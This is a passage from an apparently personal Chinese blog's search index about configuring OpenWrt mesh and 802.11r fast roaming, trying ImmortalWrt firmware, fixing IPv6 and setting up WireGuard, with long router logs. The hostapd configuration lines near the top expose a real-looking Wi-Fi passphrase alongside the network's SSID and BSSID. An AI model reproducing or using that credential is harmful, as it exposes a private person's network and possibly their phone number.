2024 kern.info kernel: [ 1538.873046] device phy0-ap0 left promiscuous mode\nSat Feb  3 22:05:21 2024 kern.info kernel: [ 1538.878005] br-lan: port 4(phy0-ap0) entered disabled state\nSat Feb  3 22:05:22 2024 daemon.notice netifd: Network device 'phy0-ap0' link is down\nSat Feb  3 22:05:22 2024 daemon.notice netifd: lan (2365): udhcpc: sending renew to server 192.168.33.1\nSat Feb  3 22:05:22 2024 daemon.notice netifd: lan (2365): udhcpc: lease of 192.168.33.212 obtained from 192.168.33.1, lease time 43200\nSat Feb  3 22:05:22 2024 daemon.notice hostapd: Configuration file: data: driver=nl80211 logger_syslog=127 logger_syslog_level=2 logger_stdout=127 logger_stdout_level=2 country_code=CN ieee80211d=1 hw_mode=g supported_rates=60 90 120 180 240 360 480 540 basic_rates=60 120 240 beacon_int=100 chanlist=1 #num_global_macaddr=1 ieee80211n=1 ht_coex=0 ht_capab=[HT40+][SHORT-GI-20][SHORT-GI-40][TX-STBC][RX-STBC1] channel=1  interface=phy0-ap0 bssid=9c:9d:7e:c6:de:32 ctrl_interface=/var/run/hostapd ap_isolate=1 bss_load_update_period=60 chan_util_avg_period=600 disassoc_low_ack=1 skip_inactivity_poll=0 preamble=1 wmm_enabled=1 ignore_broadcast_ssid=0 uapsd_advertisement_enabled=1 utf8_ssid=1 multi_ap=0 wpa_passphrase=15797678348 wpa_psk_file=/var/run/hostapd-phy0-ap0.psk auth_algs=1 wpa=2 wpa_pairwise=CCMP ssid=\u7231\u7434 bridge=br-lan wds_bridge= snoop_iface=br-lan ft_iface=br-lan mobility_domain=123d ft_psk_generate_local=1 ft_over_ds=0 reassociation_deadline=1000 wpa_disable_eapol_key_retries=0 wpa_key_mgmt=WPA-PSK FT-PSK okc=0 disable\nSat Feb  3 22:05:22 2024 kern.info kernel: [ 1539.839661] br-lan: port 4(phy0-ap0) entered blocking state\nSat Feb  3 22:05:22 2024 kern.info kernel: [ 1539.845252] br-lan: port 4(phy0-ap0) entered disabled state\nSat Feb  3 22:05:22 2024 kern.info kernel: [ 1539.851406] device phy0-ap0 entered promiscuous mode\nSat Feb  3 22:05:22 2024 kern.info kernel: [ 1539.856659] br-lan: port 4(phy0-ap0) entered blocking state\nSat Feb  3 22:05:22 2024 kern.info kernel: [ 1539.862310] br-lan: port 4(phy0-ap0) entered forwarding state\nSat Feb  3 22:05:22 2024 daemon.notice hostapd: phy0-ap0: interface state UNINITIALIZED-&gt;COUNTRY_UPDATE\nSat Feb  3 22:05:22 2024 daemon.notice hostapd: phy0-ap0: interface state COUNTRY_UPDATE-&gt;HT_SCAN\nSat Feb  3 22:05:22 2024 kern.info kernel: [ 1539.873538] device phy0-ap0 left promiscuous mode\nSat Feb  3 22:05:22 2024 kern.info kernel: [ 1539.878707] br-lan: port 4(phy0-ap0) entered disabled state\nSat Feb  3 22:05:23 2024 kern.info kernel: [ 1539.980798] br-lan: port 4(phy0-ap0) entered blocking state\nSat Feb  3 22:05:23 2024 kern.info kernel: [ 1539.986408] br-lan: port 4(phy0-ap0) entered disabled state\nSat Feb  3 22:05:23 2024 kern.info kernel: [ 1539.992532] device phy0-ap0 entered promiscuous mode\nSat Feb  3 22:05:23 2024 kern.info kernel: [ 1539.997983] br-lan: port 4(phy0-ap0) entered blocking state\nSat Feb  3 22:05:23 2024 kern.info kernel: [ 1540.003617] br-lan: port 4(phy0-ap0) entered forwarding state\nSat Feb  3 22:05:23 2024 kern.info kernel: [ 1540.010314] br-lan: port 4(phy0-ap0) entered disabled state\nSat Feb  3 22:05:23 2024 daemon.notice netifd: lan (2365): udhcpc: sending renew to server 192.168.33.1\nSat Feb  3 22:05:23 2024 daemon.notice netifd: lan (2365): udhcpc: lease of 192.168.33.212 obtained from 192.168.33.1, lease time 43200\nSat Feb  3 22:05:23 2024 daemon.notice netifd: Wireless device 'radio0' is now up\nSat Feb  3 22:05:23 2024 daemon.notice netifd: lan (2365): udhcpc: sending renew to server 192.168.33.1\nSat Feb  3 22:05:23 2024 daemon.notice netifd: lan (2365): udhcpc: lease of 192.168.33.212 obtained from 192.168.33.1, lease time 43200\nSat Feb  3 22:05:26 2024 daemon.notice hostapd: 20/40 MHz operation not permitted on channel pri=1 sec=5 based on overlapping BSSes\nSat Feb  3 22:05:26 2024 daemon.notice hostapd: Fallback to 20 MHz\nSat Feb  3 22:05:27 2024 kern.info kernel: [ 1544.109128] IPv6: ADDRCONF(NETDEV_CHANGE): phy0-ap0: link becomes ready\nSat Feb  3 22:05:27 2024 kern.info kernel: [ 1544.116051] br-lan: port 4(phy0-ap0) entered blocking state\nSat Feb  3 22:05:27 2024 kern.info kernel: [ 1544.121714] br-lan: port 4(phy0-ap0) entered forwarding state\nSat Feb  3 22:05:27 2024 daemon.notice netifd: Network device 'phy0-ap0' link is up\nSat Feb  3 22:05:27 2024 daemon.notice hostapd: phy0-ap0: interface state HT_SCAN-&gt;ENABLED\nSat Feb  3 22:05:27 2024 daemon.notice hostapd: phy0-ap0: AP-ENABLED\nSat Feb  3 22:05:31 2024 kern.info kernel: [ 1548.239427] device phy0-ap0 left promiscuous mode\nSat Feb  3 22:05:31 2024 kern.info kernel: [ 1548.244375] br-lan: port 4(phy0-ap0) entered disabled state\nSat Feb  3 22:05:31 2024 daemon.notice netifd: lan (2365): udhcpc: sending renew to server 192.168.33.1\nSat Feb  3 22:05:31 2024 daemon.notice netifd: lan (2365): udhcpc: lease of 192.168.33.212 obtained from 192.168.33.1, lease time 43200\nSat Feb  3 22:05:32 2024 daemon.notice wpa_supplicant[1248]: Set new config for phy phy0\nSat Feb  3 22:05:32 2024 daemon.notice hostapd: Set new config for phy phy0: /var/run/hostapd-phy0.conf\nSat Feb  3 22:05:32 2024 daemon.notice hostapd: Restart interface for phy phy0\nSat Feb  3 22:05:32 2024 daemon.notice hostapd: Remove interface 'phy0'\nSat Feb  3 22:05:32 2024 daemon.notice hostapd: phy0-ap0: interface state ENABLED-&gt;DISABLED\nSat Feb  3 22:05:32 2024 daemon.notice hostapd: phy0-ap0: AP-DISABLED\nSat Feb  3 22:05:32 2024 daemon.notice hostapd: phy0-ap0: CTRL-EVENT-TERMINATING\nSat Feb  3 22:05:32 2024 daemon.err hostapd: rmdir[ctrl_interface=/var/run/hostapd]: Permission denied\nSat Feb  3 22:05:32 2024 daemon.notice hostapd: nl80211: deinit ifname=phy0-ap0 disabled_11b_rates=0\nSat Feb  3 22:05:32 2024 daemon.notice hostapd: nl80211: Failed to remove interface phy0-ap0 from bridge br-lan: Invalid argument\nSat Feb  3 22:05:33 2024 daemon.notice hostapd: Configuration file: data: driver=nl80211 logger_syslog=127 logger_syslog_level=2 logger_stdout=127 logger_stdout_level=2 country_code=CN ieee80211d=1 hw_mode=g supported_rates=60 90 120 180 240 360 480 540 basic_rates=60 120 240 beacon_int=100 chanlist=1 noscan=1 #num_global_macaddr=1 ieee80211n=1 ht_coex=0 ht_capab=[HT40+][SHORT-GI-20][SHORT-GI-40][TX-STBC][RX-STBC1] channel=1  interface=phy0-ap0 bssid=9c:9d:7e:c6:de:32 ctrl_interface=/var/run/hostapd ap_isolate=1 bss_load_update_period=60 chan_util_avg_period=600 disassoc_low_ack=1 skip_inactivity_poll=0 preamble=1 wmm_enabled=1 ignore_broadcast_ssid=0 uapsd_advertisement_enabled=1 utf8_ssid=1 multi_ap=0 wpa_passphrase=15797678348 wpa_psk_file=/var/run/hostapd-phy0-ap0.psk auth_algs=1 wpa=2 wpa_pairwise=CCMP ssid=\u7231\u7434 bridge=br-lan wds_bridge= snoop_iface=br-lan ft_iface=br-lan mobility_domain=123d ft_psk_generate_local=1 ft_over_ds=0 reassociation_deadline=1000 wpa_disable_eapol_key_retries=0 wpa_key_mgmt=WPA-PSK FT-PSK okc=\nSat Feb  3 22:05:33 2024 kern.info kernel: [ 1550.139564] br-lan: port 4(phy0-ap0) entered blocking state\nSat Feb  3 22:05:33 2024 kern.info kernel: [ 1550.145154] br-lan: port 4(phy0-ap0) entered disabled state\nSat Feb  3 22:05:33 2024 kern.info kernel: [ 1550.151284] device phy0-ap0 entered promiscuous mode\nSat Feb  3 22:05:33 2024 kern.info kernel: [ 1550.156508] br-lan: port 4(phy0-ap0) entered blocking state\nSat Feb  3 22:05:33 2024 kern.info kernel: [ 1550.162130] br-lan: port 4(phy0-ap0) entered forwarding state\nSat Feb  3 22:05:33 2024 daemon.notice hostapd: phy0-ap0: interface state UNINITIALIZED-&gt;COUNTRY_UPDATE\nSat Feb  3 22:05:33 2024 kern.info kernel: [ 1550.172408] device phy0-ap0 left promiscuous mode\nSat Feb  3 22:05:33 2024 kern.info kernel: [ 1550.177434] br-lan: port 4(phy0-ap0) entered disabled state\nSat Feb  3 22:05:33 2024 kern.info kernel: [ 1550.240954] br-lan: port 4(phy0-ap0) entered blocking state\nSat Feb  3 22:05:33 2024 kern.info kernel: [ 1550.246577] br-lan: port 4(phy0-ap0) entered disabled state\nSat Feb  3 22:05:33 2024 kern.info kernel: [ 1550.252919] device phy0-ap0 entered promiscuous mode\nSat Feb  3 22:05:33 2024 kern.info kernel: [ 1550.258413] br-lan: port 4(phy0-ap0) entered blocking state\nSat Feb  3 22:05:33 2024 kern.info kernel: [ 1550.264021] br-lan: port 4(phy0-ap0) entered forwarding state\nSat Feb  3 22:05:33 2024 daemon.notice netifd: lan (2365): udhcpc: sending renew to server 192.168.33.1\nSat Feb  3 22:05:33 2024 daemon.notice netifd: lan (2365): udhcpc: lease of 192.168.33.212 obtained from 192.168.33.1, lease time 43200\nSat Feb  3 22:05:33 2024 daemon.notice netifd: lan (2365): udhcpc: sending renew to server 192.168.33.1\nSat Feb  3 22:05:33 2024 daemon.notice netifd: lan (2365): udhcpc: lease of 192.168.33.212 obtained from 192.168.33.1, lease time 43200\nSat Feb  3 22:05:33 2024 daemon.notice netifd: Network device 'phy0-ap0' link is up\nSat Feb  3 22:05:33 2024 kern.info kernel: [ 1550.479613] IPv6: ADDRCONF(NETDEV_CHANGE): phy0-ap0: link becomes ready\nSat Feb  3 22:05:33 2024 daemon.notice hostapd: phy0-ap0: interface state COUNTRY_UPDATE-&gt;ENABLED\nSat Feb  3 22:05:33 2024 daemon.notice hostapd: phy0-ap0: AP-ENABLED\nSat Feb  3 22:05:33 2024 kern.info kernel: [ 1550.608140] br-lan: port 6(phy0-mesh0) entered blocking state\nSat Feb  3 22:05:33 2024 kern.info kernel: [ 1550.613930] br-lan: port 6(phy0-mesh0) entered disabled state\nSat Feb  3 22:05:33 2024 kern.info kernel: [ 1550.620473] device phy0-mesh0 entered promiscuous mode\nSat Feb  3 22:05:33 2024 daemon.notice netifd: lan (2365): udhcpc: sending renew to server 192.168.33.1\nSat Feb  3 22:05:33 2024 daemon.notice netifd: lan (2365): udhcpc: lease of 192.168.33.212 obtained from 192.168.33.1, lease time 43200\nSat Feb  3 22:05:33 2024 daemon.notice wpa_supplicant[1248]: Set new config for phy phy0\nSat Feb  3 22:05:33 2024 daemon.notice netifd: Wireless device 'radio0' is now up\nSat Feb  3 22:05:35 2024 daemon.notice netifd: Network device 'phy0-ap0' link is down\nSat Feb  3 22:05:35 2024 kern.info kernel: [ 1552.740076] br-lan: port 4(phy0-ap0) entered disabled state\n</code></pre>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#ap-\u6a21\u5f0f\u65e0\u6cd5\u8054\u7f51","title":"AP \u6a21\u5f0f\u65e0\u6cd5\u8054\u7f51","text":"<p>AP \u6a21\u5f0f\u901a\u5e38\u53ea\u4fdd\u7559\u4e86\u4e00\u4e2a lan interface\uff0c\u5982\u679c\u8bbe\u7f6e\u4e3a\u9759\u6001 ip\uff0c\u90a3\u4e48\u8981\u4fdd\u8bc1\u4ee5\u4e0b\u8bbe\u7f6e\u624d\u80fd\u6b63\u5e38\u4e0a\u7f51</p> <ul> <li>\u8bbe\u7f6e gateway</li> <li>\u8bbe\u7f6e custom dns</li> <li>\u7981\u7528 dnsmasq</li> </ul> <p>\u68c0\u67e5</p> <ul> <li>ip ro \u67e5\u770b\u662f\u5426\u6709\u9ed8\u8ba4\u8def\u7531</li> <li>vim /etc/resolve.conf\u662f\u5426\u662f\u81ea\u5b9a\u4e49\u7684dns</li> </ul>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u6709\u7ebf\u56de\u7a0b--mesh-\u5bfc\u81f4\u5ef6\u8fdf-400ms","title":"\u6709\u7ebf\u56de\u7a0b + mesh \u5bfc\u81f4\u5ef6\u8fdf 400ms","text":"<p>op3</p> <ul> <li>--- ax6s - - mesh</li> <li>--- r3g-mesh1 - - mesh -- r3g-mesh2</li> </ul> <p>\u662f\u4e0d\u662f\u9020\u6210\u5faa\u73af\u4e86</p> <ul> <li>\u5f00\u542f mesh \u8282\u70b9\uff0c\u8fde\u63a5\u7684\u5176\u5b83 mesh \u8282\u70b9\u4e0d\u80fd\u8fde\u63a5\u6709\u7ebf\uff1f</li> </ul> <p>ax6s</p> <ul> <li>2.4G AP: 1, 40MHz, AU, 20(27) dbm</li> <li>5G AP: 149, 80MHz, AU, 27dbm rm2100</li> <li>2.4G AP: disabled</li> <li>5G AP: 36, 80MHz, AU, 23dbm</li> </ul> <p>r3g-mesh1</p> <ul> <li>2.4G mesh + AP: 1, 40MHz, AU, 26dbm</li> <li>5G AP: 149, 80MHz, AU, 23dbm</li> </ul> <p>r3g-mesh2</p> <ul> <li>2.4G mesh + AP: 1, 40MHz, default, 20dbm</li> <li>5G AP: 52, 80MHz, CN, 23dbm</li> </ul>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u7406\u8bba","title":"\u7406\u8bba","text":"<p>CCIE Wireless: 802.11r (wirelessccie.blogspot.com)</p> <ul> <li>The reassociation timeout determines the duration for which the newly negotiated key is valid. By default, if the client does not make the jump within 20 seconds, the next AP cancels the PMK-R1, considering that the client went elsewhere.</li> </ul> <p>\u65e0\u7ebf\u6293\u5305\u5f88\u96be\u529e\u5230</p> <ul> <li>\u9700\u8981\u4e13\u95e8\u7684\u7f51\u5361\u548c\u9a71\u52a8</li> <li>\u5728 Windows \u7535\u8111\u4e0a\u901a\u8fc7 wireshark \u76f4\u63a5\u65e0\u7ebf\u6293\u5305\u7684\u65b9\u5f0f - \u77e5\u4e86\u793e\u533a (h3c.com)</li> </ul>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u6d4b\u8bd5","title":"\u6d4b\u8bd5","text":"<p>\u6b63\u5e38\u65e0\u7ebf\u8fde\u63a5 op3</p> <pre><code>Thu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: authentication OK (open system)\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: event 0 notification\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-AUTHENTICATE.indication(2a:85:8f:ff:be:e3, OPEN_SYSTEM)\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DELETEKEYS.request(2a:85:8f:ff:be:e3)\nThu Aug 17 22:58:44 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: authenticated\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: association OK (aid 7)\nThu Aug 17 22:58:44 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: associated (aid 7)\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-ASSOCIATE.indication(2a:85:8f:ff:be:e3)\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DELETEKEYS.request(2a:85:8f:ff:be:e3)\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: binding station to interface 'wlan1'\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: event 1 notification\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: start authentication\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.1X: unauthorizing port\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: sending 1/4 msg of 4-Way Handshake\nThu Aug 17 22:58:45 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: EAPOL-Key timeout\nThu Aug 17 22:58:45 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: sending 1/4 msg of 4-Way Handshake\nThu Aug 17 22:58:45 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: received EAPOL-Key frame (2/4 Pairwise)\nThu Aug 17 22:58:45 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: sending 3/4 msg of 4-Way Handshake\nThu Aug 17 22:58:45 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: received EAPOL-Key frame (4/4 Pairwise)\nThu Aug 17 22:58:45 2023 daemon.notice hostapd: wlan1: AP-STA-CONNECTED 2a:85:8f:ff:be:e3\nThu Aug 17 22:58:45 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.1X: authorizing port\nThu Aug 17 22:58:45 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: pairwise key handshake completed (RSN)\nThu Aug 17 22:58:45 2023 daemon.notice hostapd: wlan1: EAPOL-4WAY-HS-COMPLETED 2a:85:8f:ff:be:e3\nThu Aug 17 22:58:45 2023 daemon.info dnsmasq-dhcp[1]: DHCPREQUEST(br-lan) 192.168.33.218 2a:85:8f:ff:be:e3\nThu Aug 17 22:58:45 2023 daemon.info dnsmasq-dhcp[1]: DHCPACK(br-lan) 192.168.33.218 2a:85:8f:ff:be:e3 Redmi-Note-11T-Pro\n</code></pre> <p>FT \u6f2b\u6e38\u5230 r3g</p> <pre><code>Thu Aug 17 23:01:41 2023 daemon.notice hostapd: wlan1: AP-STA-DISCONNECTED 2a:85:8f:ff:be:e3\nThu Aug 17 23:01:41 2023 daemon.err hostapd: nl80211: kernel reports: key addition failed\nThu Aug 17 23:01:41 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: binding station to interface 'wlan1'\nThu Aug 17 23:01:41 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: authentication OK (FT)\nThu Aug 17 23:01:41 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-AUTHENTICATE.indication(2a:85:8f:ff:be:e3, FT)\nThu Aug 17 23:01:41 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: association OK (aid 1)\nThu Aug 17 23:01:41 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: associated (aid 1)\nThu Aug 17 23:01:41 2023 daemon.notice hostapd: wlan1: AP-STA-CONNECTED 2a:85:8f:ff:be:e3\nThu Aug 17 23:01:41 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-REASSOCIATE.indication(2a:85:8f:ff:be:e3)\nThu Aug 17 23:01:41 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: binding station to interface 'wlan1'\nThu Aug 17 23:01:41 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: event 6 notification\nThu Aug 17 23:01:41 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: FT authentication already completed - do not start 4-way handshake\n</code></pre> <p>\u5728 op3 \u4e0a\u8fd8\u80fd\u770b\u5230 dhcp</p> <pre><code>Thu Aug 17 23:01:42 2023 daemon.info dnsmasq-dhcp[1]: DHCPDISCOVER(br-lan) 2a:85:8f:ff:be:e3\nThu Aug 17 23:01:42 2023 daemon.info dnsmasq-dhcp[1]: DHCPOFFER(br-lan) 192.168.33.218 2a:85:8f:ff:be:e3\nThu Aug 17 23:01:42 2023 daemon.info dnsmasq-dhcp[1]: DHCPREQUEST(br-lan) 192.168.33.218 2a:85:8f:ff:be:e3\nThu Aug 17 23:01:42 2023 daemon.info dnsmasq-dhcp[1]: DHCPACK(br-lan) 192.168.33.218 2a:85:8f:ff:be:e3 Redmi-Note-11T-Pro\n</code></pre>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/03/2022-10-03-%E5%B0%9D%E8%AF%95%E9%9D%9E%E5%AE%98%E6%96%B9openwrt/","title":"\u5c1d\u8bd5\u975e\u5b98\u65b9 openwrt","text":"","tags":["openwrt","immortalwrt"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/03/2022-10-03-%E5%B0%9D%E8%AF%95%E9%9D%9E%E5%AE%98%E6%96%B9openwrt/#\u8bf4\u660e","title":"\u8bf4\u660e","text":"<p>\u6211\u7684\u7ea2\u7c73 ac2100 \u4e0d\u77e5\u9053\u600e\u4e48\u56de\u4e8b\uff0c\u4f7f\u7528\u81ea\u5df1\u7f16\u8bd1\u7684\u56fa\u4ef6\uff0c\u65e0\u6cd5\u5f00\u542f 5G \u65e0\u7ebf\u3002radio1 \u663e\u793a not active\uff0c\u5e76\u4e14\u4e3a 802.11n \u534f\u8bae\u3002\u5148\u540e\u5c1d\u8bd5\u7f16\u8bd1 22.03-rc6, 21.02 \u7a33\u5b9a\u7248\u90fd\u662f\u5982\u6b64\u3002\uff08\u5b98\u65b9\u7a33\u5b9a\u7248\u662f\u6709\u7684\uff09(\u60f3\u5230\u4e00\u4e9b\u7b2c\u4e09\u65b9\u7684 openwrt \u8bf4\u9488\u5bf9\u56fd\u5185\u8fdb\u884c\u4e86\u4f18\u5316\uff0c\u56e0\u6b64\u60f3\u5c1d\u8bd5\u4e0b\u7b2c\u4e09\u65b9\u7684 openwrt</p>","tags":["openwrt","immortalwrt"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/03/2022-10-03-%E5%B0%9D%E8%AF%95%E9%9D%9E%E5%AE%98%E6%96%B9openwrt/#\u56fd\u5185\u4e09\u5927\u5b9a\u5236\u5316-openwrt","title":"\u56fd\u5185\u4e09\u5927\u5b9a\u5236\u5316 openwrt","text":"<p>lienol \u9879\u76ee\uff1a\uff1ahttps://github.com/Lienol/openwrt</p> <p>lean \u9879\u76ee\uff1ahttps://github.com/coolsnowwolf/lede</p> <p>immortalwrt: https://github.com/immortalwrt/immortalwrt</p>","tags":["openwrt","immortalwrt"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/03/2022-10-03-%E5%B0%9D%E8%AF%95%E9%9D%9E%E5%AE%98%E6%96%B9openwrt/#immortalwrt","title":"Immortalwrt","text":"<p>\u7f16\u8bd1\u65f6\u53d1\u73b0\u591a\u4e86\u4e00\u4e9b\u5e94\u7528\uff0c\u5e76\u4e14\u8c8c\u4f3c\u81ea\u52a8\u52fe\u9009\u4e86\u4e00\u4e9b\u5e94\u7528\uff0c\u6bd4\u5982 ssr\u3002 \u5c1d\u8bd5\u4f7f\u7528 immortalwrt\uff0c\u7f16\u8bd1\u8fc7\u7a0b\u611f\u89c9\u66f4\u5feb\u4e86\uff1f \u7528 sysupgrade \u56fa\u4ef6\u66f4\u65b0\u5b98\u65b9 openwrt \u540e\uff0c5G wifi \u786e\u5b9e\u6062\u590d\u4e86\u3002</p>","tags":["openwrt","immortalwrt"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/03/2022-10-03-%E5%B0%9D%E8%AF%95%E9%9D%9E%E5%AE%98%E6%96%B9openwrt/#\u5b98\u65b9\u56fa\u4ef6\u4e0b\u8f7d","title":"\u5b98\u65b9\u56fa\u4ef6\u4e0b\u8f7d","text":"<p>ImmortalWrt Firmware Selector</p>","tags":["openwrt","immortalwrt"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/03/2022-10-03-%E5%B0%9D%E8%AF%95%E9%9D%9E%E5%AE%98%E6%96%B9openwrt/#ipv6-\u95ee\u9898","title":"ipv6 \u95ee\u9898","text":"<p>\u53d1\u73b0 pppoe \u540e\uff0cwan_6 \u6ca1\u6709 ipv6 \u5730\u5740\uff0c\u786e\u5b9a\u914d\u7f6e\u6ca1\u6709\u95ee\u9898\u540e\uff0c\u5076\u7136\u53d1\u73b0\u662f\u6ca1\u6709 odhcpd \u5bfc\u81f4\u7684\uff08WAN6 \u63a5\u53e3\u663e\u793a\u4e0d\u652f\u6301\u7684\u534f\u8bae\uff0c\u5bf9\u6bd4\u539f\u672c\u53d1\u73b0 dhcp \u914d\u7f6e\u4e2d\u53ea\u6709 dnsmasq\uff0c\u6ca1\u6709 odhcpd\uff09</p> <p>\u5bf9\u6bd4\u5b98\u65b9\u7248\u672c\uff0c\u53d1\u73b0\u9700\u8981\u5728 make menuconfig \u65f6\uff0c\u5728 Network \u7c7b\u522b\u4e2d\u5f00\u542f</p> <ul> <li>odhcp6c</li> <li>odhcpd-ipv6only</li> </ul> <p>\u5f00\u542f\u540e\uff0cipv6 \u6062\u590d\u4e86\u6b63\u5e38</p>","tags":["openwrt","immortalwrt"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/03/2022-10-03-%E5%B0%9D%E8%AF%95%E9%9D%9E%E5%AE%98%E6%96%B9openwrt/#fullcone-nat","title":"FullCone NAT","text":"<p>immortalwrt \u6709\u4e2a Turbo ACC \u8f6f\u4ef6\u652f\u6301\u8bbe\u7f6e\u5168\u9525\u578b NAT\uff0c\u8fd9\u5bf9 P2P \u8054\u673a\u5f88\u53cb\u597d</p> <p></p>","tags":["openwrt","immortalwrt"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/","title":"Wireguard \u7ec4\u7f51","text":"<p>wireguard \u662f\u4e00\u79cd\u57fa\u4e8e UDP \u7684\u96a7\u9053\u534f\u8bae\uff0c\u53ef\u4ee5\u5728\u4e0d\u540c\u8bbe\u5907\u95f4\u5efa\u7acb\u865a\u62df\u96a7\u9053\uff0c\u4ece\u800c\u8fde\u63a5\u4e0d\u540c\u5b50\u7f51\u3002\u672c\u6587\u603b\u7ed3\u4e86\u4e0d\u540c\u4f7f\u7528\u573a\u666f</p>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u5f02\u5730\u7ec4\u7f51","title":"\u5f02\u5730\u7ec4\u7f51","text":"<p>\u5f02\u5730\u7ec4\u7f51\u5c31\u662f\u901a\u8fc7\u96a7\u9053\u6280\u672f\uff0c\u5c06\u4e24\u4e2a\u72ec\u7acb\u7684\u7f51\u7edc\u6253\u901a\uff0c\u8ba9\u5176\u4e2d\u7684\u8bbe\u5907\u80fd\u591f\u901a\u8fc7\u5185\u7f51\u5730\u5740\u76f4\u63a5\u76f8\u4e92\u8bbf\u95ee\u3002</p>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#wg-\u4e09\u5c42\u96a7\u9053","title":"wg \u4e09\u5c42\u96a7\u9053","text":"<p>\u7531\u4e8e\u5de5\u4f5c\u5728\u4e09\u5c42\uff0c\u6240\u4ee5\u5173\u952e\u5728\u4e8e\u8def\u7531\u8868\u7684\u8bbe\u7f6e\u3002</p> <p>\u963f\u91cc\u4e91\u6709 VPC \u7684\u6982\u5ff5\uff0cVPC \u4e4b\u95f4\u662f\u9694\u79bb\u7684\u3002\u963f\u91cc\u4e91\u63d0\u4f9b\u4e86\u4e00\u4e9b\u65b9\u5f0f\u8ba9\u5176\u76f8\u4e92\u8fde\u63a5\u3002\u8fd9\u548c\u6211\u4eec\u7684\u9700\u6c42\u662f\u975e\u5e38\u7c7b\u4f3c\u7684\u3002 \u4e91\u4f01\u4e1a\u7f51\u548c VPN 